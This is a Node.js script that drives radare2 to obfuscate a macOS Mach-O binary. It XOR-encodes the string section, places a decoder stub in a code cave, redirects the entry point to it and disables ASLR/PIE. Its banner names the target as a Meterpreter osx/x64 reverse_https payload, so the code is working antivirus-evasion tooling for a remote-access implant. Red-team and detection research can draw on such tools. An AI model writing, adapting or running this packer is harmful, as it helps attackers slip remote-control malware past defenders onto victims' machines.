const r2promise = require('r2pipe-promise')
const fs = require('fs')
const mustache = require('mustache')
const execFileSync = require('child_process').execFileSync

const XOR_KEY = 0xf

function calculate_jmp_back(entry_point) {
  return '0x' + (parseInt(entry_point, 16) + 6).toString(16) // TODO: patch back original bytes and jmp at entry point
}

async function find_entry_point(r2) {
  return await r2.cmd('s')
}

async function find_entry_point_instructions(r2) {
  return await r2.cmdj('pdj 3')
}

async function find_code_cave(r2, sections_to_xor) {
  console.log(await r2.cmd(`?E Searching for code caves`))
  const length = 100
  const res = (await r2.cmd(`/x ${'00'.repeat(length)}`)).split('\n')
  if (res.length < 2) {
    throw new Error(`Could not find a code cave of length ${length}`)
  }

  const executable_sections = (await r2.cmdj('iSj')).filter(x => x.perm === '-r-x')
  const code_caves = res
    .map(x => x.split(' ')[0]) // last is empty line
    .filter(x => x)
    .filter(code_cave => {
      if (code_cave && executable_sections.some(x => x.vaddr <= parseInt(code_cave, 16) && (x.vaddr + x.vsize) > parseInt(code_cave, 16))) {
        console.log(`POTENTIAL CODE CAVE => ${code_cave}`)
        return code_cave
      }
    })

  if (!code_caves.length) {
    throw new Error(`Could not find an executable code cave of length ${length}`)
  }

  const valid_code_caves = code_caves.filter(code_cave => {
    return !sections_to_xor.some(x => x.vaddr <= parseInt(code_cave, 16) && (x.vaddr + x.vsize) > parseInt(code_cave, 16))
  })

  if (!valid_code_caves.length) {
    throw new Error(`Could not find an executable code cave outside the sections to xor of length ${length}`)
  }

  return valid_code_caves[0]
}

async function xor_sections(r2, sections, key = XOR_KEY) {
  for (const s of sections) {
    console.log(await r2.cmd(`?E xoring ${s.name}`))
    console.log('before xor:')
    await r2.cmd(`s ${s.vaddr}`)
    console.log(await r2.cmd(`pd 5`))
    const values = await r2.cmdj(`pxj ${s.vsize}`)
    const new_values = values.map(value => (value ^ key).toString(16).padStart(2, '0')).join('')
    fs.writeFileSync('generated/xored', new_values)
    await r2.cmd(`wxf generated/xored`)
    console.log('after xor:')
    await r2.cmd(`s ${s.vaddr}`)
    console.log(await r2.cmd(`pd 5`))
  }
}

function create_stub(jmp_back, sections, original_instructions, xor_key = XOR_KEY) {
  const template = fs.readFileSync('templates/stub.asm.mustache', { encoding: 'utf-8' })
  const data = {
    sections,
    original_instructions,
    xor_key,
    jmp_back,
  }

  const instance = mustache.render(template, data)
  fs.writeFileSync('generated/stub.asm', instance)
}

function get_page_start(addr) {
  return Number(BigInt(addr) >> 12n << 12n)
}

async function find_sections(r2) {
  const WHITELIST = [
    //'0.__TEXT.__text',
    '3.__TEXT.__cstring',
    //'23.__DATA.__data'
  ]

  const sections = (await r2.cmdj('iSj'))
    .filter(s => WHITELIST.includes(s.name))
    .map(s => ({
      ...s,
      page_start: get_page_start(s.vaddr),
      psize: (s.vaddr - get_page_start(s.vaddr) + s.vsize)
    }))

  return sections
}

async function patch_entry_point(r2, entry_point, code_cave) {
  console.log(await r2.cmd(`?E Patching entry point`))
  await r2.cmd(`s ${entry_point}`)
  console.log(`original entry point:\n${await r2.cmd('pd 5')}`)
  await r2.cmd(`"wa jmp ${code_cave}; nop"`)
  console.log(`new entry point:\n${await r2.cmd('pd 5')}`)
}

async function patch_code_cave(r2, code_cave) {
  console.log(await r2.cmd(`?E Writing stub`))
  await r2.cmd(`s ${code_cave}`)
  console.log(`code cave:\n${await r2.cmd('pd 5')}`)
  await r2.cmd(`waf generated/stub.asm`)
  console.log(`written stub:\n${await r2.cmd('pd 28')}`)
}

async function remove_pie(r2, file) {
  console.log(await r2.cmd(`?E Disabling ASLR & PIE - ${file}`))
  console.log(execFileSync('python',  ['deps/disable_aslr/disable_aslr.py', file], { encoding: 'utf-8' }))
}

async function main(file) {
  try {
    const r2 = await r2promise.open(file, ['-w'])
    console.log(await r2.cmd(`?E Meterpreter osx/x64/meterpreter_reverse_https manual ofbuscation - ${file}`))
    const entry_point = await find_entry_point(r2)
    const jmp_back = calculate_jmp_back(entry_point)
    const sections = await find_sections(r2)
    const code_cave = await find_code_cave(r2, sections)
    const entry_point_instructions = await find_entry_point_instructions(r2)
    create_stub(jmp_back, sections, entry_point_instructions)
    await xor_sections(r2, sections)
    await patch_entry_point(r2, entry_point, code_cave)
    await patch_code_cave(r2, code_cave)
    await remove_pie(r2, file)
    console.log(await r2.cmd(`?E Done! Check ${file}`))
    return r2.quit()
  } catch (err) {
    console.error(err)
  }
}

if (!process.argv[2]) {
    console.log(`Usage: nodejs index.js <FILE>`)
    return
}

fs.copyFileSync(process.argv[2], process.argv[2] + '-obfuscated');

main(process.argv[2] + '-obfuscated')
